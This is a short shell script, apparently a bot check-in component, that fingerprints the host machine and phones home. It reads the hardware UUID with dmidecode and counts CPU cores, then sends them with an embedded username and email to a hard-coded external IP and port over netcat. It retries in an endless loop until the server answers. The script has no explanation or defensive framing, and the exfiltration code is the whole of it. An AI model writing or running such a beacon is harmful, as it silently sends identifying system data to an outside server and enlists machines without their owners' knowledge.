#!/bin/sh
_wait () {
	while ! nc -z 149.28.31.125 45569;
	do sleep 5;
	done;
};
_exec () {
	echo 'tungbui|Azure-g@gmail.com|`dmidecode | grep -w UUID | sed "s/^.UUID: //g"`|`grep -c ^processor /proc/cpuinfo`|' | nc -q -1 149.28.31.125 45569;
	echo 'Port closed. Waiting server to open port...';
	_wait;
	_exec;
};_exec;
